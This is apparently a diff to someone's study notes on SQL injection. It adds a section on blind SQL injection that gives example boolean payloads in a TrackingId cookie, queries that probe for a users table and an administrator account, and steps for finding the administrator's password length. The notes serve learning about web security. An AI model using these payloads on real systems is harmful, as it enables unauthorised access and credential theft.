@@ -56,3 +56,27 @@ hold string data by submitting a series of UNION SELECT payloads that place a st
   - `SELECT * FROM information_schema.tables`
   - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
 
+# Blind SQL Injection
+
+### Test to see if application is vulnerable to blind SQLi
+Force a true statement buy injectiong `' and 1=1--` (true) and `' and 1=2--` (false) at the end of the tracking id to see how the application responds to a true statement and a false statement. We can use the difference in how the application responds to gather information about the system.
+> Example `Cookie: TrackingId=Tz8WopT2zdfF3ayw' and 1=1--; session=3NYJZxhVb8RYO3dnt4ia4hYVL8zidlNQ` true message
+> Example `Cookie: TrackingId=Tz8WopT2zdfF3ayw' and 1=2--; session=3NYJZxhVb8RYO3dnt4ia4hYVL8zidlNQ` false message
+
+#### Example qureies on how to inject code for information in blind SQLi
+- `' and (select 'x' from users LIMIT 1)='x'--` This quiere states that if there is a users_table return x. If there is a users_table then we will get a true response back, if there is no users_table then we will get a false response back.
+- `' and (select username from users where username='administrator')='administrator'--` If the first quiere returns true and there is a users table then we can also send this queire to see if there is an administrators account in the users_table
+
+#### Password enumeration with blind SQLi
+1. Find out the length of the password: `' and (select username from users where username='administrator' and LENGTH (password)>1)='administrator'--` This quiere returns true if the password length is grater than 1. Increase the lenght number after every true message untill you get a false message indicating the passowrd length 
+> Example: This set of quereies indicated that the password lenght is 16 characters long
+```
+`' and (select username from users where username='administrator' and LENGTH (password)>14)='administrator'--` true
+`' and (select username from users where username='administrator' and LENGTH (password)>15)='administrator'--` true
+`' and (select username from users where username='administrator' and LENGTH (password)>16)='administrator'--` flase
+```
+
+
+
+
+
